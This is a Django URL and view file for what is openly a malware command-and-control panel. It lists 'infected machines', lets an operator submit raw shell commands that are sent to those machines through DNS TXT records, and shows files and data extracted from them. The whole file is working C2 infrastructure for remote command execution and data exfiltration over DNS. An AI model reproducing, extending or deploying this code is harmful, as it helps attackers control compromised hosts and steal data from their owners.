"""
URL configuration for djangoproject project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/6.0/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
import os
import re

from decouple import config
from django.conf import settings
from django.http import HttpRequest
from django.shortcuts import render, redirect
# from django.contrib import admin
from django.urls import include, path
from django.utils import timezone
from django.views.decorators.http import require_POST

from .models import InfectedMachine, Job
from .services.DnsService import DnsService


def index(request: HttpRequest):
    return render(request, "index.html", {
        "machinesCount": InfectedMachine.objects.count(),
        "jobsCount": Job.objects.count(),
        "jobsExecuting": Job.objects.filter(finished_at=None).count(),
    })

def machines(request: HttpRequest):
    return render(request, "machines.html", {
        "machines": InfectedMachine.objects.order_by('-created_at').all(),
    })

def jobs(request: HttpRequest):
    filter_machine_id = request.GET.get('machine_id', None)
    if filter_machine_id:
        jobs = Job.objects.filter(infected_machine=filter_machine_id).order_by('-created_at').all()
    else:
        jobs = Job.objects.order_by('-created_at').all()

    return render(request, "jobs.html", {
        "jobs": jobs,
        "filter_machine_id": filter_machine_id,
    })

def show_job_extracted(request: HttpRequest, job_id: int):
    job = Job.objects.filter(id=job_id).first()
    if job is None:
        return redirect('jobs')

    files_tree = 'No folder'
    if os.path.exists(job.data_folder_path()):
        files_tree = file_tree(job.data_folder_path())

    extracted = 'No file yet'
    if os.path.isfile(job.extracted_file_path()):
        with open(job.extracted_file_path(), 'r') as f:
            extracted = f.read()

    return render(request, "job_extracted.html", {
        "job": job,
        "files_tree": files_tree,
        "extracted": extracted,
    })

@require_POST
def machine_delete(_: HttpRequest, machine_id: int):
    machine = InfectedMachine.objects.filter(id=machine_id).first()
    if machine is not None:
        machine.delete()

    return redirect('machines')

@require_POST
def job_create(request: HttpRequest, machine_id: int):
    machine = InfectedMachine.objects.filter(id=machine_id).first()
    raw_command = request.POST.get('command')
    if machine is None or raw_command is None or machine.get_current_job() is not None:
        return redirect('machines')

    new_job = machine.job_set.create()
    new_job.raw_command = raw_command
    new_job.save()

    DnsService().set_job_txt(machine, raw_command).apply()

    return redirect('machines')

@require_POST
def job_delete(_: HttpRequest, job_id: int):
    job = Job.objects.filter(id=job_id).first()
    if job is not None:
        job.delete()

    return redirect('jobs')

@require_POST
def job_force_finish(_: HttpRequest, job_id: int):
    job = Job.objects.filter(id=job_id).first()
    if job is not None:
        job.jobendqueue_set.create(processable_at=timezone.now())
        job.finished_at = timezone.now()

    return redirect('jobs')

def debug(request: HttpRequest):
    dns_pointer = 'Fichier inexistant'
    dns_pointer_path = config('DNS_POINTER_FILE', '')
    if os.path.isfile(dns_pointer_path):
        with open(dns_pointer_path, 'r') as f:
            dns_pointer = f.read()

    data_folder_tree = 'Dossier inexistant'
    data_folder_path = config('FOLDER_DATA', '')
    if os.path.exists(data_folder_path):
        data_folder_tree = file_tree(data_folder_path)

    dns_service = DnsService()
    dns_zone = dns_service.print_zone()

    return render(request, "debug.html", {
        "dns_pointer": dns_pointer,
        "data_folder_tree": data_folder_tree,
        "dns_zone": dns_zone,
    })

def file_tree(folder_path: str, prefix="", squash=True) -> str:
    def natural_sort_key(s):
        return [int(c) if c.isdigit() else c.lower() for c in re.split(r'(\d+)', s)]

    def squash_entries(entries):
        """Group consecutive files matching same base name + number pattern."""
        result = []
        i = 0
        while i < len(entries):
            entry = entries[i]
            # Check if filename matches "name-NUMBER" pattern
            match = re.match(r'^(.+-)(\d+)$', entry.name)
            if not squash or not match or entry.is_dir():
                result.append(entry)
                i += 1
                continue
            base, num = match.group(1), int(match.group(2))
            # Find consecutive sequence
            j = i + 1
            expected = num + 1
            while j < len(entries):
                m = re.match(r'^(.+-)(\d+)$', entries[j].name)
                if m and m.group(1) == base and int(m.group(2)) == expected:
                    expected += 1
                    j += 1
                else:
                    break
            if j > i + 1:  # at least 2 in sequence
                result.append((entry, entries[j - 1]))  # (first, last)
                i = j
            else:
                result.append(entry)
                i += 1
        return result

    result = f"{folder_path}\n" if prefix == '' else ''
    raw_entries = sorted(os.scandir(folder_path), key=lambda f: natural_sort_key(f.name))
    entries = squash_entries(raw_entries)

    for i, entry in enumerate(entries):
        connector = "└── " if i == len(entries) - 1 else "├── "
        if isinstance(entry, tuple):  # squashed range
            first, last = entry
            m_first = re.match(r'^(.+-)(\d+)$', first.name)
            m_last = re.match(r'^(.+-)(\d+)$', last.name)
            base = m_first.group(1).rstrip('-')
            n_first, n_last = int(m_first.group(2)), int(m_last.group(2))
            result += prefix + connector + f"{base}{{{n_first}, {n_first + 1}, ..., {n_last}}}\n"
        else:
            result += prefix + connector + entry.name + ("/" if entry.is_dir() else "") + "\n"
            if entry.is_dir():
                extension = "    " if i == len(entries) - 1 else "│   "
                result += file_tree(entry.path, prefix + extension, squash=squash)

    return result

urlpatterns = [
    #    path('admin/', admin.site.urls),
    path('', index, name='index'),
    path('machines', machines, name='machines'),
    path('machine/delete/<int:machine_id>', machine_delete, name='machine_delete'),
    path('jobs', jobs, name='jobs'),
    path('debug', debug, name='debug'),
    path('job/create/<int:machine_id>', job_create, name='job_create'),
    path('job/force-finish/<int:job_id>', job_force_finish, name='job_force_finish'),
    path('job/delete/<int:job_id>', job_delete, name='job_delete'),
    path('job/show-extracted/<int:job_id>', show_job_extracted, name='show_job_extracted'),
]
if settings.DEBUG:
    # Include django_browser_reload URLs only in DEBUG mode
    urlpatterns += [
        path("__reload__/", include("django_browser_reload.urls")),
    ]
